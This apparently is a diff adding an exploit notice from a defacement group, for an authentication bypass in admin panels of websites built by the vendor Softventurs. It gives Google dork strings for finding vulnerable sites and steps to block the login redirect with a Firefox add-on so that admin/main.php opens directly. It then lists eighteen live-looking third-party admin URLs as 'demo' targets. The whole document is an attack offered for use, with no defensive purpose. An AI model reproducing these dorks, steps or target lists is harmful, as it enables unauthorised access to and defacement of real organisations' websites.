@@ -1,0 +1,42 @@
+https://www.magelang1337.com/2017/12/admin-page-noredirect-softventurs.html
+
+#################################################################################
+# Exploit Title: Admin Page Noredirect [softventurs]
+# Author : Magelang1337
+# Google Dork 1 : Developed by Softventurs
+# Google Dork 2 : Designed By - softventurs
+# Google Dork 3 : Powered By - softventurs
+# Date : 21.12.2017
+# Vendor Home: http://www.softventurs.in
+# Tested On Mozilla Firefox
+#################################################################################
+ 
+Tutorial :
+ 
+[+] Download Addons "Noredirect" [Mozilla]
+[+] insert admin page >> http://gauravbooks.com/admin/ to Addons Mozilla [Noredirect]
+[+] Open new tab on Mozilla >> http://gauravbooks.com/admin/main.php
+ 
+Demo :
+ 
+http://gauravbooks.com/admin/
+http://www.chaperonbiotech.com/admin/
+http://www.rataniti.com/admin/
+http://garimaprakashan.com/admin/
+http://www.baradeviiti.org/admin/
+http://deltinlaboratories.com/admin/
+http://www.paradisepublicschool.co.in/admin/
+http://chandralokprakashan.com/admin/
+http://www.sagimetalbox.com/admin/
+http://timesacademychakarpur.in/admin/
+http://maavaishnoiti.org/admin/
+http://blossombuds.org/admin/
+http://baradeviiti.in/admin/
+http://www.stitchindia.co/admin/
+http://www.gurukulit.com/admin/
+http://meplast.in/admin/
+http://www.aksharschool.in/admin/
+http://iteeseducation.org/admin/
+ 
+::: Magelang1337 ~ All defacer indonesia
+#################################################################################
